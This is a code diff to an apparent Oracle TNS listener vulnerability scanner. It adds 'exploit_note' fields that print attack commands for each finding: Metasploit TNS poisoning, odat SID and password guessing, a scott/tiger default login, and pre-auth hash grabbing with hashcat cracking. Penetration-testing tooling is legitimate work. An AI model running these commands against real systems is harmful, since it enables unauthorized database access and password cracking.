@@ -131,14 +131,22 @@ _CVE_MAP: tuple = (
       "description": "Listener accepts unsolicited remote instance registration from any "
                      "IP; a rogue instance can MITM subsequent client sessions. "
                      "Mitigation: ADMIN_RESTRICTIONS_<listener>=ON and valid-node "
-                     "checking (Oracle Alert CVE-2012-1675)."}),
+                     "checking (Oracle Alert CVE-2012-1675).",
+      "exploit_note": "For CVE-2012-1675: msf auxiliary/admin/oracle/tnspoison_checker "
+                      "RHOST=<ip>; for CVE-2012-3137: native o5logon-grab per "
+                      "oracle_listener_status_leak.",
+      "depth_tier": "t0"}),
     (lambda v: bool(v) and v <= (11, 2, 0, 3),
      {"id": "CVE-2012-3137", "severity": "high",
       "title": "o5logon pre-auth hash disclosure",
       "description": "The AUTH exchange for a known SID returns AUTH_SESSKEY + "
                      "AUTH_VFR_DATA to any client that names a user, yielding a "
                      "SHA-1/AES-192 hash that JtR ('oracle11') and hashcat (mode 3100) "
-                     "crack offline."}),
+                     "crack offline.",
+      "exploit_note": "For CVE-2012-1675: msf auxiliary/admin/oracle/tnspoison_checker "
+                      "RHOST=<ip>; for CVE-2012-3137: native o5logon-grab per "
+                      "oracle_listener_status_leak.",
+      "depth_tier": "t0"}),
 )
 
 
@@ -377,7 +385,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                 f"# then odat passwordguesser with the default-account list",
                 "Set a listener password / valid-node-checking (TCP.VALIDNODE_CHECKING), "
                 "apply the CVE-2012-1675 fix, remove default accounts, firewall 1521.",
-                ["CWE-306", "CWE-1188"], kind="oracle_tns_exposed"))
+                ["CWE-306", "CWE-1188"], kind="oracle_tns_exposed",
+                exploit_note=(
+                    f"odat all -s {h.ip} -p {p.portid}; odat sidguesser -s {h.ip} "
+                    f"-p {p.portid}; odat passwordguesser -s {h.ip} -p {p.portid} "
+                    "-d <SID> --accounts-file default.txt; sqlplus "
+                    f"scott/tiger@{h.ip}:{p.portid}/<SID>."),
+                depth_tier="t1"))
             if pr.get("version_leaked"):
                 out.append(_finding(
                     "medium", "Oracle TNS listener version disclosure", tgt,
@@ -402,7 +416,9 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Apply the corresponding Oracle CPU / security-alert patch and "
                     "harden the listener (ADMIN_RESTRICTIONS_<listener>=ON, "
                     "valid-node checking, remove default accounts).",
-                    ["CWE-1035"], kind="oracle_known_vulnerable_version"))
+                    ["CWE-1035"], kind="oracle_known_vulnerable_version",
+                    exploit_note=cve.get("exploit_note", ""),
+                    depth_tier=cve.get("depth_tier", "")))
             # NEW: listener status / services dump (SIDs, service names, machine).
             sids = pr.get("sids") or []
             svc_names = pr.get("service_names") or []
@@ -425,7 +441,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Enable LOCAL_OS_AUTHENTICATION_<listener>=ON, set "
                     "ADMIN_RESTRICTIONS_<listener>=ON, and restrict listener admin "
                     "to the local UNIX socket / named-pipe.",
-                    ["CWE-200"], kind="oracle_listener_status_leak"))
+                    ["CWE-200"], kind="oracle_listener_status_leak",
+                    exploit_note=(
+                        f"For each SID, python3 pre-auth-oracle-hash-grab.py -s {h.ip} "
+                        f"-p {p.portid} -d <SID> -u SYS -o hashes.txt; then hashcat "
+                        "-m 3100 hashes.txt rockyou.txt (JtR: oracle11 format)."),
+                    depth_tier="t1"))
             # NEW: SCAN/RAC REDIRECT payload exposes an internal cluster endpoint.
             redir = pr.get("redirect") or {}
             if redir.get("host"):
